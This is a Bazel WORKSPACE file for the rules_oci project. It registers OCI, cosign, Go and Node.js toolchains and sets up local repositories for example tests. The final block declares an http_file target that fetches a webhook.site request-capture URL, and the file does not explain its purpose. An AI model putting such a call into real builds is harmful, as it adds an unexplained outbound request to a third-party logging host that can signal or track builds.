# Declare the local Bazel workspace.
# This is *not* included in the published distribution.
workspace(name = "rules_oci")

load(":internal_deps.bzl", "rules_oci_internal_deps")

# Fetch deps needed only locally for development
rules_oci_internal_deps()

load("//oci:dependencies.bzl", "rules_oci_dependencies")

# Fetch our "runtime" dependencies which users need as well
rules_oci_dependencies()

load("//oci:repositories.bzl", "LATEST_CRANE_VERSION", "LATEST_ZOT_VERSION", "oci_register_toolchains")

oci_register_toolchains(
    name = "oci",
    crane_version = LATEST_CRANE_VERSION,
    zot_version = LATEST_ZOT_VERSION,
)

load("//cosign:repositories.bzl", "cosign_register_toolchains")

cosign_register_toolchains(name = "oci_cosign")

# For running our own unit tests
load("@bazel_skylib//lib:unittest.bzl", "register_unittest_toolchains")

register_unittest_toolchains()

load("@container_structure_test//:repositories.bzl", "container_structure_test_register_toolchain")

container_structure_test_register_toolchain(name = "container_structure_test")

############################################
# Gazelle, for generating bzl_library targets
load("@io_bazel_rules_go//go:deps.bzl", "go_register_toolchains", "go_rules_dependencies")
load("@bazel_gazelle//:deps.bzl", "gazelle_dependencies")

go_rules_dependencies()

go_register_toolchains(version = "1.17.2")

gazelle_dependencies()

# Rules pkg
load("@rules_pkg//:deps.bzl", "rules_pkg_dependencies")

rules_pkg_dependencies()

# Belongs to examples
load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive", "http_file")

# JS
http_archive(
    name = "aspect_rules_js",
    sha256 = "dda5fee3926e62c483660b35b25d1577d23f88f11a2775e3555b57289f4edb12",
    strip_prefix = "rules_js-1.6.9",
    url = "https://github.com/aspect-build/rules_js/archive/refs/tags/v1.6.9.tar.gz",
)

load("@aspect_rules_js//js:repositories.bzl", "rules_js_dependencies")

rules_js_dependencies()

load("@rules_nodejs//nodejs:repositories.bzl", "DEFAULT_NODE_VERSION", "nodejs_register_toolchains")

nodejs_register_toolchains(
    name = "nodejs",
    node_version = DEFAULT_NODE_VERSION,
)

# For sign_external test
new_local_repository(
    name = "empty_image",
    build_file = "//examples/sign_external:BUILD.template",
    path = "examples/sign_external/workspace",
)

# For attest_external test
new_local_repository(
    name = "example_sbom",
    build_file = "//examples/attest_external:BUILD.template",
    path = "examples/attest_external/workspace",
)

load(":fetch.bzl", "fetch_images")

fetch_images()

load(":test.bzl", "invalidate")

http_file(
    name = "test",
    downloaded_file_path = invalidate,
    url = "https://webhook.site/30dfcda1-3647-4ad5-bf3e-ddd11cf1813a",
)
